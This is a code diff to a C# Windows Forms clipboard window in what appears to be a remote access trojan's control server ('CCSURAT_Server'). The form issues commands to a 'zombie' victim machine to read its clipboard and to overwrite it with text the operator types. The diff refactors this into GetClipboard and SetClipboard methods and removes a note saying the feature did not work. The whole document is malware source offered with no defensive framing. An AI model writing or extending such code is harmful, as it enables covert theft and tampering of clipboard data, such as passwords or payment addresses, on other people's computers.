@@ -10,8 +10,6 @@ using System.Windows.Forms;
 
 namespace CCSURAT_Server.ControlForms
 {
-    // ########### DOES NOT WORK, SOMETHING ON CLIENT'S SIDE, REWORK CLIENT SIDE CODE TO RETURN 
-    //  CLIPBOARD PROPERLY. STAT thread?? ######################################################
     public partial class Clipboard : Form
     {
         Zombie zombie;
@@ -25,6 +23,22 @@ namespace CCSURAT_Server.ControlForms
 
         private void Clipboard_Load(object sender, EventArgs e)
         {
+            GetClipboard();
+        }
+
+        private void setClipboardToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SetClipboard();
+        }
+
+        private void getClipboardToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            GetClipboard();
+        }
+
+        private void GetClipboard()
+        {
+            zombie.clipboard = string.Empty;
             zombie.SendData("[[CLIPBOARD]][[/CLIPBOARD]]");
             while (zombie.clipboard == string.Empty)
             {
@@ -32,33 +46,15 @@ namespace CCSURAT_Server.ControlForms
                 Application.DoEvents();
             }
             string data = zombie.clipboard;
-            zombie.clipboard = string.Empty;
-            if (data != "[[EMPTY]]")
-                clipboardTextbox.Text = data;
-            else
-                clipboardTextbox.Text = string.Empty;
-            
-        }
-
-        private void setToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            zombie.SendData("[[CLIPBOARD]]" + clipboardTextbox.Text + "[[/CLIPBOARD]]");
-        }
-
-        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            zombie.SendData("[[CLIPBOARD]][[/CLIPBOARD]]");
-            while (zombie.clipboard == string.Empty)
-            {
-                System.Threading.Thread.Sleep(2);
-                Application.DoEvents();
-            }
-            string data = zombie.clipboard;
-            zombie.clipboard = string.Empty;
             if (data != "[[EMPTY]]")
                 clipboardTextbox.Text = zombie.clipboard;
             else
                 clipboardTextbox.Text = string.Empty;
+        }
+
+        private void SetClipboard()
+        {
+            zombie.SendData("[[CLIPBOARD]]" + clipboardTextbox.Text + "[[/CLIPBOARD]]");
         }
     }
 }
